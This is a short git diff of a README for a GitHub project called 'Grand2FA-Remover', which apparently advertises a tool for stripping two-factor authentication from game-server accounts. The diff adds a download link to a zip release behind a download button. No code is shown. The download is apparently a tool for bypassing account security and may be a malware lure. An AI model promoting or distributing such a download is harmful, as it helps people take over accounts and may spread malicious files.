@@ -10,7 +10,7 @@
 [Showcase](https://github.com/Hax0RX/Grand2FA-Remover/blob/main/README.md#showcase)<br/>
 [Credits](https://github.com/Hax0RX/Grand2FA-Remover/blob/main/README.md#credits)<br/>
   
-<a href="">
+<a href="https://github.com/Hax0rX/Grand2FA-Remover/releases/download/GrandRP/Grand2FA.Remover.zip">
   <img src="https://i.postimg.cc/zBv6HHx8/download-ragemp.png"/>
 </a>
   
